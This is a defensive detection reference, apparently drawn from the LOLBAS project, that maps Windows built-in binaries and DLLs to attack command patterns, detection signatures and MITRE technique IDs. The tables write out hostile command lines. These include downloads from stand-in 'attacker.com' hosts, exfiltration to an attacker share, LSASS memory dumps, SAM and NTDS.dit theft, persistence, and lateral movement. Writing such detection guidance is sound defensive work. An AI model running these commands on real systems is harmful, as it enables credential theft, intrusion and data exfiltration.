# LOLBAS — Complete Detection Reference

> Source: LOLBAS Project (https://lolbas-project.github.io/) — 150+ entries
> Last updated: 2026-07-07
> Purpose: Comprehensive detection signatures for Living Off The Land Binaries, Scripts, and Libraries

---

## Execution / Code Execution

| Binary | Technique | Command Pattern | Detection | MITRE |
|--------|-----------|----------------|-----------|-------|
| `mshta.exe` | Execute HTA/VBS/JS | `mshta.exe vbscript:...`, `mshta.exe http://...` | mshta with URL or script arg | T1218.005 |
| `rundll32.exe` | Execute DLL exports | `rundll32.exe path.dll,Entry`, `rundll32 javascript:...` | Unusual DLL paths, javascript protocol | T1218.011 |
| `regsvr32.exe` | Execute COM scriptlets | `regsvr32 /s /n /u /i:http://... scrobj.dll` | Network connections from regsvr32 | T1218.010 |
| `msbuild.exe` | Compile/execute C#/VB | `msbuild.exe project.csproj` | MSBuild spawning non-build processes | T1127.001 |
| `installutil.exe` | Execute .NET assembly | `installutil.exe /logfile= /LogToConsole=false payload.dll` | InstallUtil loading non-standard DLLs | T1218.004 |
| `cmstp.exe` | Execute INF/SCT | `cmstp.exe /ni /s payload.inf` | cmstp with /ni /s flags | T1218.003 |
| `wmic.exe` | Remote/local exec | `wmic process call create`, `wmic /format:http://` | WMI process creation, XSL format load | T1218 |
| `forfiles.exe` | Proxy execution | `forfiles /p C:\windows\system32 /m notepad.exe /c "cmd /c calc"` | Forfiles spawning unexpected children | T1202 |
| `pcalua.exe` | Proxy execution | `pcalua.exe -a payload.exe` | pcalua with command-line arguments | T1202 |
| `explorer.exe` | Proxy execution | `explorer.exe /root,"payload.exe"` | Explorer with unusual command-line | T1202 |
| `control.exe` | Load CPL/DLL | `control.exe payload.cpl` | Loading .cpl from non-System32 | T1218.002 |
| `presentationhost.exe` | Execute XAML | `presentationhost.exe payload.xbap` | PresentationHost with file argument | T1218 |
| `bash.exe` | Execute Linux binaries | `bash.exe -c "command"` (WSL) | bash.exe spawning processes | T1202 |
| `scriptrunner.exe` | Proxy execution | `scriptrunner.exe -appvscript cmd.exe` | scriptrunner spawning child processes | T1218 |
| `syncappvpublishingserver.exe` | Execute PowerShell | `SyncAppvPublishingServer.exe "n;cmd"` | SyncAppv with semicolons in args | T1218 |
| `ssh.exe` | Proxy execution | `ssh -o ProxyCommand="cmd" .`, `ssh localhost cmd` | SSH with ProxyCommand on Windows | T1202 |
| `scp.exe` | Proxy execution | `scp -o ProxyCommand="cmd" . localhost:.` | SCP with ProxyCommand | T1202 |
| `sftp.exe` | Proxy execution | `sftp -o ProxyCommand="cmd" .`, `sftp -D "cmd"` | SFTP with ProxyCommand or -D flag | T1202 |
| `hh.exe` | Execute CHM/bat | `hh.exe http://attacker.com/payload.chm` | HH.exe with remote URLs | T1218 |
| `ftp.exe` | Execute commands | `ftp -s:commands.txt` (contains `!cmd`) | FTP launching child processes | T1202 |
| `diskshadow.exe` | Execute via script | `diskshadow /s script.txt` (contains `exec cmd`) | Diskshadow spawning processes | T1218 |
| `mavinject.exe` | DLL injection | `mavinject.exe <PID> /INJECTRUNNING path.dll` | Mavinject with injection args | T1218.013 |
| `mmc.exe` | Execute snap-in | `mmc.exe -Embedding payload.msc` | MMC loading non-standard MSC | T1218.014 |
| `msdt.exe` | Execute via protocol | `msdt -id PCWDiagnostic /moreoptions false /skip true` | MSDT with diagnostic arguments | T1218 |
| `stordiag.exe` | Sideloading | Copy stordiag + rename payload to `schtasks.exe` in same dir | stordiag from non-system paths | T1218 |

## Download / File Transfer

| Binary | Technique | Command Pattern | Detection | MITRE |
|--------|-----------|----------------|-----------|-------|
| `certutil.exe` | Download file | `certutil -urlcache -f http://... file.exe` | certutil with `-urlcache` or `-verifyctl` | T1105 |
| `bitsadmin.exe` | Download file | `bitsadmin /transfer job http://... path` | BITS transfers to unusual URLs | T1105 |
| `MpCmdRun.exe` | Download file | `MpCmdRun -DownloadFile -url http://... -path file.exe` | Defender binary downloading files | T1105 |
| `curl.exe` | Download file | `curl -o file.exe http://...` (Win10+) | curl.exe with external URLs | T1105 |
| `finger.exe` | Download data | `finger user@attacker.com \| cmd` | Finger connecting to external hosts | T1105 |
| `replace.exe` | Copy from UNC | `replace \\attacker\share\payload.exe C:\target /A` | Replace copying from network shares | T1105 |
| `esentutl.exe` | Copy files | `esentutl /y \\share\file.exe /d local.exe /o` | Esentutl copying from network/ADS | T1105 |
| `print.exe` | Copy from UNC | `print /D:local.exe \\share\payload.exe` | Print.exe with UNC paths | T1105 |
| `expand.exe` | Extract from CAB | `expand \\share\payload.cab C:\target /F:*` | Expand from network paths | T1105 |
| `extrac32.exe` | Extract from CAB | `extrac32 /Y /C \\share\payload.cab C:\target` | Extrac32 with network paths | T1105 |
| `makecab.exe` | Exfil via CAB | `makecab sensitive.doc \\attacker\share\out.cab` | Makecab with UNC destinations | T1048 |
| `hh.exe` | Download CHM | `hh.exe http://attacker.com/payload.chm` | HH connecting to external URLs | T1105 |
| `tar.exe` | Extract from UNC | `tar -xf \\share\archive.tar` | Tar with UNC source paths | T1105 |

## Credential Dumping

| Binary/Library | Technique | Command Pattern | Detection | MITRE |
|---------------|-----------|----------------|-----------|-------|
| `comsvcs.dll` | LSASS MiniDump | `rundll32 comsvcs.dll MiniDump <PID> dump.bin full` | rundll32 accessing LSASS | T1003.001 |
| `rdrleakdiag.exe` | Process dump | `rdrleakdiag /p <LSASS_PID> /o C:\temp /fullmemdmp /wait 1` | rdrleakdiag targeting LSASS PID | T1003.001 |
| `diskshadow.exe` | VSS NTDS.dit | Script: `set context persistent nowriters` → `expose %shadow% Z:` | Diskshadow creating shadow copies | T1003.003 |
| `wbadmin.exe` | Backup NTDS.dit | `wbadmin start backup -include:C:\Windows\NTDS\NTDS.dit` | Wbadmin backing up NTDS/SYSTEM | T1003.003 |
| `esentutl.exe` | Copy locked files | `esentutl /y /vss C:\Windows\NTDS\NTDS.dit /d C:\temp\ntds.dit` | Esentutl with /vss flag on DB files | T1003.003 |
| `vssadmin.exe` | Shadow copy | `vssadmin create shadow /for=C:` → copy from shadow | VSS shadow creation + file copy | T1003.003 |
| `ntdsutil.exe` | IFM snapshot | `ntdsutil "activate instance ntds" "ifm" "create full C:\temp"` | ntdsutil IFM creation | T1003.003 |
| `reg.exe` | Save SAM/SYSTEM | `reg save HKLM\SAM C:\temp\sam`, `reg save HKLM\SYSTEM C:\temp\sys` | reg.exe saving security hives | T1003.002 |

## Persistence Mechanisms

| Binary | Technique | Command Pattern | Detection | MITRE |
|--------|-----------|----------------|-----------|-------|
| `bitsadmin.exe` | BITS job persist | `bitsadmin /create /download job` + `/SetNotifyCmdLine` | BITS jobs with notification commands | T1197 |
| `netsh.exe` | Helper DLL | `netsh add helper malicious.dll` | Netsh loading non-system DLLs | T1546.007 |
| `schtasks.exe` | Scheduled task | `schtasks /create /tn name /tr cmd /sc onlogon` | Task creation events (4698) | T1053.005 |
| `sc.exe` | Service creation | `sc create svcname binpath= "payload.exe"` | Service install events (7045) | T1543.003 |
| `reg.exe` | Run key | `reg add HKCU\...\Run /v name /d payload.exe` | Registry modification of Run keys | T1547.001 |
| `at.exe` | Legacy scheduler | `at 09:00 /every:M,T,W,TH,F cmd /c payload.exe` | AT command usage (deprecated but works) | T1053.002 |

## Reconnaissance / Surveillance

| Binary | Technique | Command Pattern | Detection | MITRE |
|--------|-----------|----------------|-----------|-------|
| `pktmon.exe` | Packet capture | `pktmon start --etw`, `pktmon filter add -p 445` | Pktmon execution, .etl file creation | T1040 |
| `netsh.exe` | Network trace | `netsh trace start capture=yes` | Netsh trace commands | T1040 |
| `psr.exe` | Screen recording | `psr.exe /start /output C:\temp\capture.zip` | PSR execution | T1113 |

## Alternate Data Streams (ADS)

| Binary | Technique | Command Pattern | Detection | MITRE |
|--------|-----------|----------------|-----------|-------|
| `certutil.exe` | Write to ADS | `certutil -urlcache -f http://... file.txt:payload` | certutil targeting ADS paths | T1564.004 |
| `print.exe` | Copy to ADS | `print /D:file.txt:hidden.exe source.exe` | Print with ADS destination | T1564.004 |
| `esentutl.exe` | Copy to/from ADS | `esentutl /y source.exe /d file.txt:hidden.exe /o` | Esentutl with colon in paths | T1564.004 |
| `tar.exe` | Archive to ADS | `tar -cf file.txt:archive folder/` | Tar with ADS target | T1564.004 |
| `MpCmdRun.exe` | Download to ADS | `MpCmdRun -DownloadFile -url ... -path file.txt:ads.exe` | MpCmdRun with ADS destination | T1564.004 |
| `wmic.exe` | Execute from ADS | `wmic process call create "file.txt:payload.exe"` | WMI executing ADS content | T1564.004 |
| `forfiles.exe` | Execute from ADS | `forfiles /p ... /c "file.txt:payload.exe"` | Forfiles executing ADS content | T1564.004 |

## Lateral Movement via LOLBAS

| Binary/Script | Technique | Command Pattern | Detection | MITRE |
|--------------|-----------|----------------|-----------|-------|
| `winrm.vbs` | Remote WMI exec | `winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd"} -r:http://target:5985` | WinRM script invoking remote processes | T1021.006 |
| `wmic.exe` | Remote exec | `wmic /node:"target" process call create "cmd"` | WMIC with /node parameter | T1047 |
| `schtasks.exe` | Remote task | `schtasks /create /s target /u user /p pass /tn task /tr cmd` | schtasks with /s (remote server) | T1053.005 |
| `sc.exe` | Remote service | `sc \\target create svc binpath= cmd` | sc.exe with UNC target | T1569.002 |

## Evasion via LOL Libraries (LOLLibs)

| Library | Technique | Command Pattern | Detection | MITRE |
|---------|-----------|----------------|-----------|-------|
| `comsvcs.dll` | Process dump | `rundll32 comsvcs.dll, MiniDump` | rundll32 + comsvcs.dll + MiniDump | T1003.001 |
| `shell32.dll` | Execute | `rundll32 shell32.dll,ShellExec_RunDLL cmd` | rundll32 + shell32 + ShellExec | T1218.011 |
| `advpack.dll` | Execute INF | `rundll32 advpack.dll,LaunchINFSection file.inf` | rundll32 + advpack + INF execution | T1218.011 |
| `ieadvpack.dll` | Execute INF | `rundll32 ieadvpack.dll,LaunchINFSection file.inf` | rundll32 + ieadvpack + INF | T1218.011 |
| `syssetup.dll` | Execute INF | `rundll32 syssetup.dll,SetupInfObjectInstallAction...` | rundll32 + syssetup | T1218.011 |
| `setupapi.dll` | Execute INF | `rundll32 setupapi.dll,InstallHinfSection...` | rundll32 + setupapi | T1218.011 |
| `zipfldr.dll` | Execute from ZIP | `rundll32 zipfldr.dll,RouteTheCall file.exe` | rundll32 + zipfldr executing binaries | T1218.011 |
| `url.dll` | Open URL/file | `rundll32 url.dll,OpenURL file.hta` | rundll32 + url.dll + file execution | T1218.011 |
| `ieframe.dll` | Open URL | `rundll32 ieframe.dll,OpenURL file.url` | rundll32 + ieframe + URL opening | T1218.011 |
| `scrobj.dll` | COM scriptlet | `regsvr32 /s /n /i:http://... scrobj.dll` | regsvr32 + scrobj + remote SCT | T1218.010 |
| `pcwutl.dll` | Proxy execution | `rundll32 pcwutl.dll,LaunchApplication cmd` | rundll32 + pcwutl launching processes | T1218.011 |

---

## Detection Priority Matrix

### Critical (Credential Access / Lateral Movement)
- `comsvcs.dll` MiniDump on LSASS
- `rdrleakdiag.exe` on LSASS PID
- `wbadmin.exe` / `diskshadow.exe` / `ntdsutil.exe` targeting NTDS.dit
- `reg.exe` saving SAM/SYSTEM/SECURITY hives
- `winrm.vbs` remote execution
- `wmic.exe` with `/node:` parameter

### High (Code Execution / Defense Evasion)
- `mshta.exe` with URLs or inline scripts
- `rundll32.exe` with javascript or unusual DLLs
- `regsvr32.exe` with `/s /n /u /i:http://`
- `certutil.exe` with `-urlcache` or `-encode`
- `bitsadmin.exe` with external URLs
- `ssh.exe` / `scp.exe` / `sftp.exe` with ProxyCommand

### Medium (Persistence / Reconnaissance)
- `netsh.exe` add helper
- `bitsadmin.exe` with NotifyCmdLine
- `pktmon.exe` starting captures
- `schtasks.exe` / `sc.exe` creating remote tasks/services

### Low (File Operations / Staging)
- `esentutl.exe` / `replace.exe` / `expand.exe` copying files
- `tar.exe` / `makecab.exe` for archive operations
- ADS operations via any binary
